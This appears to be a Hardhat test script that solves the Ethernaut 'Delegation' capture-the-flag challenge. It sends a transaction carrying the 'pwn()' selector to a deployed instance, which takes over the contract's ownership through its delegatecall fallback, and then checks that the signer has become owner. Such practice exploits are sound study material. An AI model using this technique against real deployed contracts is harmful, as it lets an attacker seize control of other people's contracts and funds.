import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("Delegation", function () {
    let signer: Signer;
    let myAddress: string;
    let challenge_instance_address = "0x027AF243e8223b84b600F8b8489165B568235181";
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    before(async () => {
        [signer] = await ethers.getSigners();
        myAddress = await signer.getAddress();
        console.log("Primary Signer Address:", myAddress);
        challengeFactory = await ethers.getContractFactory("Delegation");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {
        const gasPrice = await signer.getGasPrice();
        const options = {
            to: challenge.address,
            data: ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()")).substring(0, 10),
            from: myAddress,
            gasLimit: 50000,
            gasPrice
        }
        const tx = await signer.sendTransaction(options);
        const receipt = await tx.wait();
        const owner = await challenge.owner();
        expect(owner).to.equal(myAddress);
    });
});
